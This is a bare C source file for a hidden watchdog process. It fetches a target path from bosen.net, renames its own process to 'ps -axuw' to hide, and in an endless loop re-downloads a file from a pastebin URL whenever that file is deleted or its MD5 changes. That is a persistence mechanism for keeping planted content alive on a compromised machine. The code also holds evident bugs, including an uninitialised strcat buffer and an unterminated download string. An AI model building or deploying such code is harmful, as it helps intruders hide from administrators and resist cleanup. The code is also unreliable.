#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <openssl/md5.h>
#include <curl/curl.h>

#define SRC             "https://pastebin.com/raw/eVjujdc1"
#define SRC_HASH        "6807828dbfab3dfa1301a0cbfc497cab"
#define CONF_URL        "https://bosen.net/"
#define PS_NAME         "ps -axuw"

struct string {
  char *ptr;
  size_t len;
};

void init_string(struct string *s) {
  s->len = 0;
  s->ptr = malloc(s->len+1);
  if (s->ptr == NULL) {
    fprintf(stderr, "malloc() failed\n");
    exit(EXIT_FAILURE);
  }
}

size_t writefunc(void *ptr, size_t size, size_t nmemb, struct string *s)
{
  size_t new_len = s->len + size*nmemb;
  s->ptr = realloc(s->ptr, new_len+1);
  if (s->ptr == NULL) {
    fprintf(stderr, "realloc() failed\n");
    exit(EXIT_FAILURE);
  }
  memcpy(s->ptr+s->len, ptr, size*nmemb);

  return size*nmemb;
}

void rtrim(char *src)
{
  size_t i, len;
  volatile int isblank = 1;

  if(src == NULL) return;

  len = strlen(src);
  if(len == 0) return;
  for(i = len - 1; i > 0; i--) {   
    isblank = isspace(src[i]);
    if(isblank)
      src[i] = 0;
    else
      break;
  }   
  if(isspace(src[i]))
    src[i] = 0;
}

char *calc_hash(const char *filename) {
  unsigned char c[MD5_DIGEST_LENGTH];
  int i;
  MD5_CTX mdContext;
  int bytes;
  unsigned char data[1024];
  char *filemd5 = (char*) malloc(33 *sizeof(char));

  FILE *fs = fopen(filename, "rb");
  if (fs == NULL) {
    perror(filename); // TODO: not exist ? restore
    exit(1);
  }
  
  MD5_Init(&mdContext);
  while ((bytes = fread(data, 1, 1024, fs)) != 0)
    MD5_Update(&mdContext, data, bytes);
  MD5_Final(c,&mdContext);

  for(i = 0; i < MD5_DIGEST_LENGTH; i++) {
    sprintf(&filemd5[i*2], "%02x", (unsigned int)c[i]);
  }

  fclose(fs);
  return filemd5;
}

int restore(char *arg) {
  CURL *curl;
  
  curl = curl_easy_init();
  if (curl) {
    curl_easy_setopt(curl, CURLOPT_URL, SRC);
    curl_easy_setopt(curl, CURLOPT_HEADER, 0);

    FILE *file = fopen(arg, "w");
    if (file) {
      curl_easy_setopt(curl, CURLOPT_WRITEDATA, file);
      curl_easy_perform(curl);
      fclose(file);
    }
    curl_easy_cleanup(curl);
  }
  return 0;
}

int check_hash(char *arg) {
  char *new_hash = calc_hash(arg);
  if (strcmp(SRC_HASH, new_hash)) 
    restore(arg);
  free(new_hash);
  return 0;
}

char *readconf(char *arg) {
  CURL *curl;
  CURLcode res;
  char *ret;

  curl = curl_easy_init();
  if (curl) {
    struct string s;
    init_string(&s);

    curl_easy_setopt(curl, CURLOPT_URL, arg);
    curl_easy_setopt(curl, CURLOPT_HEADER, 0);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writefunc);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &s);
    res = curl_easy_perform(curl);
    curl_easy_cleanup(curl);
    ret = s.ptr;
    return ret;
  }
}

int main(int argc, char *argv[]) {
  char *fn, *input;
  char self[100];
  pid_t parent;
  int i;

  input = argv[0];
  (fn = strrchr(input, '/')) ? ++fn : (fn = input);
  strcat(self, CONF_URL);
  strcat(self, fn);

  input = readconf(self);
  rtrim(input);

  strcpy(argv[0], PS_NAME);

  while (1) {
    if (access(input, F_OK) != 0)
      restore(input);
 
    check_hash(input);
  }
}
